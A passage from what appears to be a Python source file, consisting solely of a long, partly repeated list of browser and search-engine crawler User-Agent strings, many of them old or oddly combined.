               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
